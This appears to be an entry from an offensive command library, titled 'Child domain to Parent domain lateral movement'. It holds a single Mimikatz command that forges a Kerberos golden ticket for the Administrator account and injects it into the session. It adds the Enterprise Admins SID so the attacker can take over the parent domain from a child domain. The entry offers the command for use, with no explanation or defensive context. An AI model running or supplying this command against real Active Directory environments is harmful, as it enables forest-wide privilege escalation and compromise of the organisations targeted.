---
id: 9d50f2c9-cc15-4b9c-b171-a1cfdeeb6410
name: Child domain to Parent domain lateral movement
type: command
executor: bash
data: 'kerberos::golden /domain:evilcorp.local /sid:S-1-5-21-3965405831-1015596948-2589850225
  /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /user:Administrator /sids:S-1-5-21-493355955-4215530352-779396340-519
  /ptt

  '
output: null
created_at: '2020-07-15T19:05:44.366831+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Child domain to Parent domain lateral movement

```bash
kerberos::golden /domain:evilcorp.local /sid:S-1-5-21-3965405831-1015596948-2589850225 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /user:Administrator /sids:S-1-5-21-493355955-4215530352-779396340-519 /ptt

```
